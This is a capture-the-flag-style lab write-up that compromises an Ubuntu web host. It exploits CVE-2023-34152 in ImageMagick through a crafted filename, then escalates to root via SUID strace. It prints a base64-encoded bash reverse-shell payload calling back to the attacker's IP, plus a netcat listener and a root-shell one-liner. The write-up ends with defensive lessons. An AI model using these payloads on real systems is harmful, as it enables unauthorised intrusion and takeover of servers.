## Overview

| Field                     | Value                                                        |
|---------------------------|--------------------------------------------------------------|
| OS                        | Linux (Ubuntu)                                               |
| Difficulty                | Easy                                                         |
| Attack Surface            | Web (HTTP/80)                                                |
| Primary Entry Vector      | CVE-2023-34152 — ImageMagick 6.9.6-4 shell command injection via filename |
| Privilege Escalation Path | SUID `/usr/bin/strace` → privileged shell (GTFOBins)         |

## Credentials

No credentials obtained.

## Reconnaissance

### Port Scan (Rustscan)

We begin with a full TCP port scan using RustScan to rapidly enumerate all open ports. RustScan's speed allows it to sweep the full 1–65535 range in seconds, handing discovered ports off to Nmap for deeper interrogation. The goal here is to quickly map the attack surface before deciding where to focus enumeration efforts.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[1:36][CPU:13][MEM:62][TUN0:192.168.45.180][/home/n0z0]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.104.178:22
Open 192.168.104.178:80
```

Two ports are open: **22 (SSH)** and **80 (HTTP)**.

### Service Enumeration (Nmap)

With open ports identified, we run a full Nmap scan with service version detection (`-sV`), default scripts (`-sC`), OS detection (`-A`), and aggressive timing (`-T4`). We treat the host as alive with `-Pn` and save the output as XML for later reference. The HTTP title will tell us what application is running on port 80.

```bash
timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
echo -e "\e[32mScan result saved to: $output_file\e[0m"
```

```bash
✅[1:36][CPU:6][MEM:61][TUN0:192.168.45.180][/home/n0z0]
🐉 > timestamp=$(date +%Y%m%d-%H%M%S)
output_file="$HOME/work/scans/${timestamp}_${ip}.xml"

grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"

echo -e "\e[32mScan result saved to: $output_file\e[0m"
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 01:36 JST
Nmap scan report for 192.168.104.178
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: ImageMagick Identifier
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   187.79 ms 192.168.45.1
2   187.74 ms 192.168.45.254
3   187.83 ms 192.168.251.1
4   187.93 ms 192.168.104.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 558.76 seconds
Scan result saved to: /home/n0z0/work/scans/20260205-013634_192.168.104.178.xml
```

Key findings:
- **Port 22**: OpenSSH 8.2p1 (Ubuntu)
- **Port 80**: Apache 2.4.41 — HTTP title is **"ImageMagick Identifier"**, revealing an image processing web application

### Web Enumeration

Navigating to port 80 reveals a web interface that accepts image uploads and passes them through ImageMagick for processing. The application exposes the ImageMagick version directly: **6.9.6-4**. This specific version is known to be affected by CVE-2023-34152.


*Caption: The web application exposes ImageMagick version 6.9.6-4 — directly disclosing the vulnerable component.*

## Initial Foothold

### CVE-2023-34152 — ImageMagick Shell Command Injection

**CVE-2023-34152** is a shell command injection vulnerability in ImageMagick versions prior to 7.1.0-48 (and the 6.x branch prior to 6.9.12-48). The vulnerability exists in the `OpenBlob()` function within `magick/blob.c`. When ImageMagick processes a filename that begins with a pipe character (`|`), it passes the filename directly to a shell via `popen()`. By crafting a malicious filename containing shell commands (e.g., using backtick substitution), an attacker can achieve arbitrary code execution on the server processing the file.

A public PoC (SudoIndividual/CVE-2023-34152) automates the attack by generating an image file whose filename embeds a base64-encoded reverse shell payload as a backtick injection.

#### Setting up the listener

Before running the exploit, we start a netcat listener wrapped with `rlwrap` for a more comfortable shell interaction. `rlwrap` provides readline support (history, arrow keys) for the raw netcat session. We listen on port 4444, the port our payload will call back to.

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[2:10][CPU:16][MEM:71][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
```

#### Generating the malicious payload

The PoC script is cloned from GitHub into a local working directory, then executed. It generates an image file whose filename contains a backtick-injected shell command. The payload is base64-encoded to avoid shell metacharacter issues. We confirm the generated file by listing the directory — the malicious filename is visible and contains the encoded reverse shell.

```bash
ls -la
```

```bash
✅[2:11][CPU:14][MEM:70][TUN0:192.168.45.180][...ound/Image/CVE-2023-34152]
🐉 > ls -la
合計 24
drwxrwxr-x 3 n0z0 n0z0 4096  2月  5 02:11  .
drwxrwxr-x 3 n0z0 n0z0 4096  2月  5 02:01  ..
drwxrwxr-x 7 n0z0 n0z0 4096  2月  5 02:01  .git
-rw-rw-r-- 1 n0z0 n0z0 1382  2月  5 02:01  CVE-2023-34152.py
-rw-rw-r-- 1 n0z0 n0z0 1192  2月  5 02:01  README.md
-rw-rw-r-- 1 n0z0 n0z0  351  2月  5 02:11 '|smile"`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xODAvNDQ0NCAwPiYxIg==|base64 -d|bash`".png'
```

The generated filename embeds the payload:
- The leading `|` triggers ImageMagick's `popen()` path
- The backtick injection runs: `echo <base64> | base64 -d | bash`
- The base64 string decodes to: `/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.180/4444 0>&1"`

This file is then uploaded to the web application, where ImageMagick processes the filename and executes the injected command.

💡 **Why this works**: ImageMagick's `OpenBlob()` function checks whether a filename starts with `|` and, if so, treats the rest of the string as a shell command executed via `popen()`. This is a legitimate feature for pipe-based input, but it becomes exploitable when user-supplied filenames are passed directly to `OpenBlob()` without sanitization. The backtick substitution inside the filename is evaluated by the shell spawned by `popen()`, executing the attacker's reverse shell payload.

#### Reverse shell received

After uploading the malicious file through the web interface, ImageMagick processes the filename and triggers the payload. The netcat listener catches the incoming connection from the server:

```bash
rlwrap -cAri nc -lvnp 4444
```

```bash
❌[2:10][CPU:16][MEM:71][TUN0:192.168.45.180][/home/n0z0]
🐉 > rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.104.178] 48010
bash: cannot set terminal process group (1131): Inappropriate ioctl for device
bash: no job control in this shell
www-data@image:/var/www/html$
```

We have a shell as `www-data`.

## Privilege Escalation

### SUID `strace` — GTFOBins Shell Escape

After landing on the target, we enumerate SUID binaries to find privilege escalation paths. Running a LinPEAS SUID check or a manual `find` surfaces a critical misconfiguration: `/usr/bin/strace` has the SUID bit set and is owned by root. This is documented as a GTFOBins escalation vector.

The LinPEAS output highlights the finding:

```bash
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwsr-sr-x 1 root root 1.6M Apr 16  2020 /usr/bin/strace
```

`strace` is a system call tracer. When the SUID bit is set, any call to `strace` runs with root's effective UID. According to [GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/#shell), `strace` can be used to exec an arbitrary shell by tracing a simple command. The `-o /dev/null` flag discards the trace output (avoiding a messy terminal), while `/bin/sh -p` spawns a shell that preserves the elevated effective UID.

💡 **Why this works**: The SUID bit causes the kernel to set the process's effective UID to the binary owner's UID (root) at exec time. `strace` then calls `execve()` to launch the traced process — in this case `/bin/sh -p`. The `-p` flag instructs `sh` to retain the elevated `euid` rather than resetting it to the real UID. The result is a root shell running under `www-data`'s real UID but root's effective UID, granting full filesystem access.

```bash
/usr/bin/strace -o /dev/null /bin/sh -p
```

```bash
www-data@image:/tmp$ /usr/bin/strace -o /dev/null /bin/sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

`euid=0(root)` confirms we are operating with root privileges.

#### Root flag

With effective root privileges, we read the proof file from `/root/`:

```bash
cat /root/proof.txt
```

```bash
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# cat /root/proof.txt
0b53b763d486a2475600aa0d96cd62d2
#
```

## Attack Chain Overview

```mermaid
flowchart LR
    subgraph KC1["Kill Chain 1: Reconnaissance"]
        direction TB
        K1A[RustScan executed]
        K1B[2 ports discovered]
        K1C["22/SSH<br/>80/HTTP"]
        K1D[Nmap detailed scan]

        K1A --> K1B --> K1C --> K1D
    end

    subgraph KC2["Kill Chain 2: Service Enumeration"]
        direction TB
        K2A[OpenSSH 8.2p1 Ubuntu]
        K2B[Apache 2.4.41 Ubuntu]
        K2C[ImageMagick Identifier]
        K2D["Version: 6.9.6-4"]

        K2A --> K2B --> K2C --> K2D
    end

    subgraph KC3["Kill Chain 3: Vulnerability Research"]
        direction TB
        K3A[ImageMagick 6.9.6-4 investigated]
        K3B[CVE-2023-34152 found]
        K3C[Shell Command Injection confirmed]
        K3D["PoC script obtained<br/>SudoIndividual"]

        K3A --> K3B --> K3C --> K3D
    end

    subgraph KC4["Kill Chain 4: Initial Access Preparation"]
        direction TB
        K4A["nc listener started<br/>192.168.45.180:4444"]
        K4B[CVE-2023-34152.py executed]
        K4C["Malicious PNG generated<br/>Base64-encoded shell"]
        K4D["Payload embedded in filename<br/>backtick injection"]

        K4A --> K4B --> K4C --> K4D
    end

    subgraph KC5["Kill Chain 5: Exploit"]
        direction TB
        K5A[PNG file uploaded]
        K5B[ImageMagick processing starts]
        K5C[OpenBlob function triggered]
        K5D[Command injection succeeds]

        K5A --> K5B --> K5C --> K5D
    end

    subgraph KC6["Kill Chain 6: Reverse Shell Established"]
        direction TB
        K6A["Connection established<br/>192.168.104.178:48010"]
        K6B[www-data shell obtained]
        K6C["uid=33 www-data confirmed"]
        K6D[Stabilization]

        K6A --> K6B --> K6C --> K6D
    end

    subgraph KC7["Kill Chain 7: Privilege Escalation"]
        direction TB
        K7A[SUID enumeration performed]
        K7B["/usr/bin/strace found<br/>rwsr-sr-x root"]
        K7C["GTFOBins consulted<br/>strace abuse method"]
        K7D["strace -o /dev/null<br/>/bin/sh -p executed"]

        K7A --> K7B --> K7C --> K7D
    end

    subgraph KC8["Kill Chain 8: Objective Achieved"]
        direction TB
        K8A[Root shell obtained]
        K8B["euid=0 egid=0 confirmed"]
        K8C["/root/proof.txt found"]
        K8D[0b53b763d486a2475600aa0d96cd62d2]

        K8A --> K8B --> K8C --> K8D
    end

    KC1 ==> KC2 ==> KC3 ==> KC4 ==> KC5 ==> KC6 ==> KC7 ==> KC8

    style KC1 fill:#e8eaf6
    style KC2 fill:#fff9c4
    style KC3 fill:#ffccbc
    style KC4 fill:#f8bbd0
    style KC5 fill:#c8e6c9
    style KC6 fill:#b3e5fc
    style KC7 fill:#ff9800
    style KC8 fill:#4caf50
    style K6B fill:#ff6b6b,color:#fff
    style K8B fill:#ff6b6b,color:#fff
    style K8D fill:#2196f3,color:#fff
```



## Lessons Learned / Key Takeaways

1. **Version disclosure is a critical information leak**: The web application displayed the ImageMagick version number directly in the page title. This single piece of information enabled immediate CVE lookup and targeted exploitation. Suppress version banners in production.

2. **Never pass user-controlled filenames directly to image processing libraries**: ImageMagick's `popen()` pipe feature is a legitimate internal mechanism, but it becomes a weaponized primitive when filenames originate from user uploads. Always sanitize or reject filenames containing shell metacharacters (`|`, `` ` ``, `$`, etc.) before processing.

3. **SUID bits on powerful utilities are high-value targets**: `strace` is a privileged debugging tool that should never have the SUID bit set on a production system. Even utilities that seem harmless can be trivially abused for privilege escalation — always cross-reference installed SUID binaries against GTFOBins.

4. **The exploit chain was entirely toolchain-driven**: From a public PoC to a GTFOBins one-liner, this machine required no custom exploit development. Keeping software patched and hardening the post-exploit environment (removing SUID on unnecessary binaries) would have broken the chain at either step.

## References

- [RustScan — Modern Port Scanner](https://github.com/RustScan/RustScan)
- [CVE-2023-34152 — NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2023-34152)
- [CVE-2023-34152 PoC — SudoIndividual (GitHub)](https://github.com/SudoIndividual/CVE-2023-34152)
- [GTFOBins — strace](https://gtfobins.github.io/gtfobins/strace/)
- [HackTricks — SUID Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid)
- [rlwrap — readline wrapper for netcat](https://github.com/hanslub42/rlwrap)
